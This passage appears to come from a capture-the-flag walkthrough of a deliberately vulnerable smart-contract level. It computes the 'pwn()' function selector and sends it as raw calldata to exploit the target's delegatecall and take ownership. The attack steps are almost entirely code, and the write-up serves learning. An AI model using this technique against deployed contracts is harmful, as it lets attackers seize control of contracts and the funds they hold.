We calculate the sighash: "0xdd365b8b".
```js
sighash = web3.utils.sha3('pwn()').substring(0, 10)
```

Or via:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

contract Delegate {
    // Copy the raw tx data
    function pwn() public {
    }
}
```

We use the sighash to send the raw tx from our EOA:

```js
await contract.sendTransaction({
    to: contract.address,
    data: '0xdd365b8b',
});
```
